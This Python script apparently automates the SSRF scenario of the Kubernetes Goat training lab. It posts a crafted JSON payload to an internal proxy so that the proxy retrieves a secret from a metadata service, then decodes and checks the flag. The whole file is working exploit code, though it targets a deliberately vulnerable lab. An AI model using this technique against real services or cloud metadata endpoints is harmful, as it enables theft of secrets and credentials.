import requests
import base64
import json
import time

def run(target_url: str) -> dict:
    """
    Scenario 3: SSRF
    Refactored for pure Python execution (no kubectl required).
    Target: Internal Proxy Service (exposed on port 3000 / host 1232)
    Goal: Access http://metadata-db/latest/secrets/kubernetes-goat
    """
    target = target_url.rstrip('/')
    
    # Helper for Docker container connectivity
    def get_accessible_target(t):
        if "127.0.0.1" in t or "localhost" in t:
            try:
                requests.get(t, timeout=2)
                return t
            except:
                # Try Gateway
                t_alt = t.replace("127.0.0.1", "172.17.0.1").replace("localhost", "172.17.0.1")
                try:
                    requests.get(t_alt, timeout=2)
                    return t_alt
                except:
                    return t
        return t

    target = get_accessible_target(target)

    # Payload to trigger SSRF
    # The internal proxy expects a POST with JSON body: {"endpoint": "URL", "method": "GET"}
    metadata_url = "http://metadata-db/latest/secrets/kubernetes-goat"
    
    payload = {
        "endpoint": metadata_url,
        "method": "GET"
    }
    
    try:
        # Send SSRF Request
        r = requests.post(target, json=payload, timeout=10)
        output = r.text
        
        # Check success
        decoded_flag = ""
        success = False
        
        # Try to decode if we see appropriate structure
        # Expected: {"metadata":..., "data": "base64..."}
        if "data" in output:
            try:
                if isinstance(r.json(), dict) and "data" in r.json():
                     b64_data = r.json()["data"]
                     decoded_flag = base64.b64decode(b64_data).decode('utf-8', errors='ignore')
            except:
                 pass
        
        if "azhzLWdvYXQt" in output or "k8s-goat" in output or "k8s-goat" in decoded_flag:
             return {
                 "success": True,
                 "output": f"""[+] VULNERABILITY DETECTED: SSRF (Server Side Request Forgery)
Target: {target}
[VERIFIED] Successfully accessed metadata-db via Internal Proxy!
Endpoint: {metadata_url}
Response Headers: {r.headers}

[Result]
Raw Response Snippet: {output[:100]}...
Decoded Flag: {decoded_flag if decoded_flag else "Could not auto-decode, but signature found."}
"""
             }
        else:
             return {
                 "success": False, 
                 "output": f"[-] SSRF Request sent to {target} but flag not found.\nOutput: {output[:200]}\nPayload sent: {json.dumps(payload)}\nResolved Target: {target}"
             }

    except Exception as e:
        return {"success": False, "output": f"[-] Exception communicating with Proxy {target}: {str(e)}"}
